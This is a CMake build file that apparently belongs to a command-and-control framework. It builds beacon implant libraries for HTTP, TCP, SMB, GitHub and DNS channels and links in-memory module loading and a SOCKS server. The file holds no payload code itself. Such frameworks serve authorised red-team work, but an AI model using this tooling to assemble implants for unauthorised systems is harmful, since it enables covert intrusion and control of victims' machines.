set(C2CORE_BEACON_COMMON_SOURCES
  Beacon.cpp
  ../listener/Listener.cpp
  ../listener/ListenerTcp.cpp
  ../listener/ListenerSmb.cpp
  ../../thirdParty/base64/base64.cpp
)

set(C2CORE_BEACON_COMMON_LINK_LIBS
  SocketHandler
  PipeHandler
  MemoryModule
  SocksServer
)

function(c2core_add_beacon_library target_name beacon_source)
  add_library(${target_name}
    ${beacon_source}
    ${C2CORE_BEACON_COMMON_SOURCES}
  )

  target_include_directories(${target_name}
    PUBLIC "${CMAKE_SOURCE_DIR}"
    PRIVATE ../modules/ModuleCmd ../listener
  )

  if(WIN32)
    set_property(TARGET ${target_name} PROPERTY MSVC_RUNTIME_LIBRARY "MultiThreaded")
    target_link_libraries(${target_name} PUBLIC
      ${C2CORE_BEACON_COMMON_LINK_LIBS}
      ${ARGN}
    )
  else()
    target_link_libraries(${target_name} PUBLIC
      ${C2CORE_BEACON_COMMON_LINK_LIBS}
      ${ARGN}
      dl
    )
  endif()
endfunction()

c2core_add_beacon_library(BeaconHttpLib BeaconHttp.cpp openssl::openssl httplib::httplib)
c2core_add_beacon_library(BeaconTcpLib BeaconTcp.cpp)
c2core_add_beacon_library(BeaconSmbLib BeaconSmb.cpp)
c2core_add_beacon_library(BeaconGithubLib BeaconGithub.cpp openssl::openssl httplib::httplib)
c2core_add_beacon_library(BeaconDnsLib BeaconDns.cpp Dnscommunication)
